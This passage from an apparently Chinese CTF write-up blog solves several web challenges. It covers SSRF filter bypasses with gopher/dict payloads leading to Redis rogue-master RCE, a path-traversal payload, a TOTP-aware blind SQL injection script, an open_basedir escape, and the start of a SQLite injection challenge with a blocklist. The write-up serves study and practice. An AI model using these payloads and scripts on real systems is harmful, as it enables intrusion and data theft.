class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        var_dump(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        safe_request_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>parse_url和curl在解析url时的差别</strong></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">完整url: scheme:<span class="selector-attr">[//[user[:password]</span>@]host<span class="selector-attr">[:port]</span>]<span class="selector-attr">[/path]</span><span class="selector-attr">[?query]</span><span class="selector-attr">[#fragment]</span></span><br><span class="line">这里仅讨论url中不含<span class="string">&#x27;?&#x27;</span>的情况</span><br><span class="line"></span><br><span class="line">php parse_url：</span><br><span class="line">host: 匹配最后一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">libcurl：</span><br><span class="line">host：匹配第一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//u:p@a.com:80@b.com/</span></span><br><span class="line"></span><br><span class="line">php解析结果：</span><br><span class="line">    schema: http </span><br><span class="line">    host: <span class="selector-tag">b</span>.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p@<span class="selector-tag">a</span><span class="selector-class">.com</span>:<span class="number">80</span></span><br><span class="line">libcurl解析结果：</span><br><span class="line">    schema: http</span><br><span class="line">    host: <span class="selector-tag">a</span>.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p</span><br><span class="line">    port: <span class="number">80</span></span><br><span class="line">    后面的@<span class="selector-tag">b</span>.com/会被忽略掉</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210309224002.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210309224148.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>首先对传入的url进行check_inner_ip检查是否为内网ip地址，这一部分限制了部分协议的使用，使用parse_url解析url，并使用gethostname、ip2long函数获取ip地址以及将ip地址转化为整数，要想返回为false，则不能使用内网ip发送请求。<br>通过检查则返回safe_request_url使用curl处理。</p>
<p>题目提示</p>
<blockquote>
<p>// Please visit hint.php locally.</p>
</blockquote>
<p>我们构造如下url传入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//0.0.0.0/hint.php</span></span><br></pre></td></tr></table></figure>
<p>0.0.0.0的IP地址表示整个网络，代表所有主机的ipv4地址，传入绕过</p>
<p>这里用ip进制转换右移进行比较，绕过方法还有：</p>
<p>1.<code>http://0x7f000001/hint.php</code></p>
<p>2.<code>http://@127.0.0.1./hint.php</code>(这种方法在比赛时可用，不过BUU不行)</p>
<h3 id="redis主从复制rce"><a href="#redis主从复制rce" class="headerlink" title="redis主从复制rce"></a>redis主从复制rce</h3><p>hint.php内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>],<span class="string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到redis密码为root<br><code>file_put_contents($_POST[&#39;file&#39;],&quot;&lt;?php echo &#39;redispass is root&#39;;exit();&quot;.$_POST[&#39;file&#39;]);</code>可以绕过写shell，不过试了下没有写权限。同理redis写shell也行不通了</p>
<p>尝试请求:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?url=dict://0x7f000001:6379/info</span><br></pre></td></tr></table></figure>
<p>返回的数据为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">string(73) &quot;-NOAUTH Authentication required.</span><br><span class="line">-NOAUTH Authentication required.</span><br><span class="line">+OK</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure>
<p>说明需要认证，因为dict协议使用比较方便，可以直接在<code>/</code>后面跟上redis明文命令执行；可尝试使用dict协议进行认证：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?url=dict://0x7f000001:6379/auth+root</span><br></pre></td></tr></table></figure>
<p>返回的数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">string(44) &quot;-NOAUTH Authentication required.</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure>
<p>说明认证成功</p>
<p>但是dict只能执行一条redis命令，由于执行每个操作之前都要进行认证，那么就要用到可以一次执行多条命令的gopher协议</p>
<p><strong>使用gopher 探测信息</strong></p>
<p>空格二次编码后为<code>%2520</code>，换行符二次编码后为<code>%250a</code>；需要在每条命令后加上换行符</p>
<p>使用payload：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?url=gopher:<span class="regexp">//</span><span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">6379</span>/_AUTH%2520root%250ainfo%250aquit</span><br></pre></td></tr></table></figure>
<p>得到redis版本等信息：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Server</span></span><br><span class="line"><span class="attribute">redis_version</span>:<span class="number">5</span>.<span class="number">0</span>.<span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>那么很显然是要用到<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">redis-post-exploitation</a>中提出的redis主从复制rce了</p>
<p>简单说下原理：</p>
<ul>
<li><code>slaveof</code>（新版改为<code>REPLICAOF</code>）建立后slave会向master发送<code>PSYNC</code>，请求开始复制</li>
<li>master可以返回<code>FULLRESYNC</code>，进行全量复制，然后将自己持久化的数据发给slave，正常情况下包括<code>Replication ID</code>, <code>offset</code>，master存储的key-value等等</li>
<li>slave会将这些数据保存到config中<code>dbfilename</code>指定的文件（默认为dump.rdb），然后再载入。</li>
<li>通过伪造master，可以控制发往slave的信息，从而做到无脏数据写文件</li>
<li>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件</li>
<li>因此通过FULLRESYNC写入恶意so文件，然后<code>MODULE LOAD /path/to/mymodule.so</code>载入模块即可rce</li>
</ul>
<p>做法</p>
<p>两篇需要的github地址</p>
<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">项目1</a></p>
<p><a href="https://github.com/xmsec/redis-ssrf">项目2</a></p>
<p>把redis-rogue-server这个项目里的exp.so放在redis-ssrf-master这个项目下!，同时对<code>ssrf-redis</code>文件作如下三处修改</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第一处 125行左右</span></span><br><span class="line">elif mode==<span class="number">3</span>:</span><br><span class="line">        lhost=<span class="string">&quot;vpn ip地址&quot;</span></span><br><span class="line">        lport=<span class="string">&quot;6666&quot;</span>            <span class="comment">//这里无需修改，应为要同rogue-server.py文件的端口相对应 </span></span><br><span class="line">        command=<span class="string">&quot;cat /flag&quot;</span>      <span class="comment">//需要执行的命令</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第二处 140行左右</span></span><br><span class="line">	ip=<span class="string">&quot;0.0.0.0&quot;</span>   </span><br><span class="line">    port=<span class="string">&quot;6379&quot;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第三处 160行左右</span></span><br><span class="line">	<span class="comment"># input auth passwd or leave blank for no pw</span></span><br><span class="line">    passwd = <span class="string">&#x27;root&#x27;</span> </span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210310000532.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>将得到的payload二次url编码传参，即可得到flag</p>
<p><img src="https://img.npfs06.top/20210310000022.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h2><p>源码下载下来，在index.php中有一个毫无过滤的本地文件包含</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$action</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] : <span class="string">&#x27;home.php&#x27;</span>);</span><br><span class="line"> <span class="keyword">if</span> (file_exists(<span class="variable">$action</span>)) &#123;</span><br><span class="line">     <span class="keyword">include</span> <span class="variable">$action</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;File not found!&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?action=..<span class="regexp">/../</span>..<span class="regexp">/../</span>../flag</span><br></pre></td></tr></table></figure>


<h2 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h2><p>打开是个很炫酷的页面，看样子是个 linux终端, 然后看一下有哪些命令可以调用</p>
<p><img src="https://img.npfs06.top/20210310230356.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>经过测试，发现在login处存在sql盲注</p>
<p><img src="https://img.npfs06.top/20210310221906.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>但是在写 exp 之前还需要来看看是怎么和服务器通讯的，通过查看数据流我们发现有个 totp参数，且再次提交之后这个 totp 又会发生改变</p>
<p><img src="https://img.npfs06.top/20210310231129.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>TOTP算法 (Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。</strong></p>
<p><strong>一些要求：</strong></p>
<p><strong>令牌与服务器之间必须时钟同步；</strong><br><strong>令牌与服务器之间必须共享密钥；</strong><br><strong>令牌与服务器之间必须使用相同的时间步长</strong><br><strong>核心算法：</strong><br><strong>TOTP =Truncate(HMAC-SHA-1(K, (T - T0) / X))</strong><br><strong>X 是时间间隔</strong></p>
<p>我们需要知道密钥</p>
<p><img src="https://img.npfs06.top/20210310231536.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210310234243.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>所以重点就是<code>totp = pyotp.TOTP(&#39;GAXG24JTMZXGKZBU&#39;, 8, interval=5)</code>也就是长度为8，间隔为5</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">&quot;GAXG24JTMZXGKZBU&quot;</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">chars = <span class="string">&quot;!#$%&amp;()+,-./0123456789?ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://a664c97d-663f-494d-a65d-83d2891353c6.node3.buuoj.cn/shell.php?a=login%20admin&#x27;/**/and(&#123;&#125;)and/**/&#x27;1&#x27;=&#x27;1%201&amp;totp=&#123;&#125;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select/**/group_concat(password)/**/from/**/users),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">r =requests.Session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="comment">#print(url.format(payload.format(i,ord(char)), totp.now()))</span></span><br><span class="line">        res = r.get(url.<span class="built_in">format</span>(payload.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(char)), totp.now()))</span><br><span class="line">        print(res.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;user&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            result += char</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210310223205.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>得到密码：<code>hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</code></p>
<p>密码里提示有个隐藏命令 <code>sh0w_hiiintttt_23333</code> ，可以得到提示 <code>eval</code> 在 <code>launch</code> 的时候被调用。</p>
<p><img src="https://img.npfs06.top/20210310232716.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><code>launch</code> 前需要先用 <code>targeting</code> 设置，不过对输入有限制，这里可以 <code>fuzz</code> 一下，得知 <code>code</code> 限制 <code>a-zA-Z0-9</code> ，position限制 <code>a-zA-Z0-9&#125;)$(&#123;_+-,.</code> ，而且两者的长度也有限制。</p>
<p>总结一下每个命令。</p>
<ul>
<li>targeting code position =&gt;储存一条 $code = “position”;</li>
<li>launch =&gt; 将上面 targeting 起来的 code 按照字典序跑一遍。</li>
<li>destuct =&gt; 清空，恢复初始状态</li>
</ul>
<p>这里需要用 <code>php可变变量</code> 构造和拼接 <code>payload</code> 。</p>
<p><img src="https://img.npfs06.top/20210310235106.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>外面包个 {}，里面的东西会被 执行 后拿返回值。变量后面加个 ()，就会尝试调用这个变量里存的名字所指向的函数。</p>
<p>首先读取phpinfo文件</p>
<p><img src="https://img.npfs06.top/20210311000258.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>保存，本地html格式打开，就可以看到可视化界面了</p>
<p><img src="https://img.npfs06.top/20210311000456.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这里看到有 open_basedir，得想办法绕过 <code>open_basedir</code> 的限制，<a href="https://xz.aliyun.com/t/4720">https://xz.aliyun.com/t/4720</a></p>
<p>绕过的 payload 如下。</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">&#x27;img&#x27;</span>);<span class="selector-tag">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="selector-tag">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="selector-tag">echo</span>(file_get_contents(<span class="string">&#x27;flag&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>参考网上师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a664c97d-663f-494d-a65d-83d2891353c6.node3.buuoj.cn/shell.php?a=%s&amp;totp=%s&#x27;</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">&quot;GAXG24JTMZXGKZBU&quot;</span>, digits=<span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">password</span>):</span></span><br><span class="line">    username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    payload = <span class="string">&#x27;login %s %s&#x27;</span> % (username, password)</span><br><span class="line">    payload = urllib.parse.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span>():</span></span><br><span class="line">    payload = <span class="string">&#x27;destruct&#x27;</span></span><br><span class="line">    payload = urllib.parse.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span>(<span class="params">code, position</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;targeting %s %s&#x27;</span> % (code, position)</span><br><span class="line">    payload = urllib.parse.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span>():</span></span><br><span class="line">    payload = <span class="string">&#x27;launch&#x27;</span></span><br><span class="line">    payload = urllib.parse.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    <span class="keyword">return</span> s.get(payload).text</span><br><span class="line"></span><br><span class="line">login(<span class="string">&#x27;hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;&#x27;</span>)</span><br><span class="line">destruct()</span><br><span class="line">targeting(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;&#123;$a(46)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;&#123;$b&#125;&#123;$b&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;&#123;$a(47)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;js&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;open_basedir&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;chdir&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;ini_set&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;file_get_&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;&#123;$i&#125;contents&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;&#123;$g($e)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;&#123;$h($f,$c)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;&#123;$g($c)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;&#123;$h($f,$d)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;&#123;$d&#125;flag&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;&#123;$j($o)&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;&#123;$q($p)&#125;&#x27;</span>)</span><br><span class="line">print(launch())</span><br></pre></td></tr></table></figure>


<h2 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h2><p>题目还给了一段sql语句，可知flag在flag表里</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `vote`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `vote` (</span><br><span class="line">  `id` <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY AUTOINCREMENT,</span><br><span class="line">  `name` TEXT <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `count` <span class="type">INTEGER</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `vote` (`name`, `count`) <span class="keyword">VALUES</span></span><br><span class="line">  (<span class="string">&#x27;dog&#x27;</span>, <span class="number">0</span>),</span><br><span class="line">  (<span class="string">&#x27;cat&#x27;</span>, <span class="number">0</span>),</span><br><span class="line">  (<span class="string">&#x27;zebra&#x27;</span>, <span class="number">0</span>),</span><br><span class="line">  (<span class="string">&#x27;koala&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `flag`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `flag` (</span><br><span class="line">  `flag` TEXT <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `flag` <span class="keyword">VALUES</span> (<span class="string">&#x27;HarekazeCTF&#123;&lt;redacted&gt;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>




<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vote.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// &quot; % &#x27; * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">&quot;[\&quot;%&#x27;*+\\/&lt;=&gt;\\\\_`~-]&quot;</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">&#x27;\s&#x27;</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">&#x27;blob&#x27;</span>, <span class="string">&#x27;load_extension&#x27;</span>, <span class="string">&#x27;char&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(in|sub)str&#x27;</span>, <span class="string">&#x27;[lr]trim&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;match&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;limit&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;join&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/json; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span 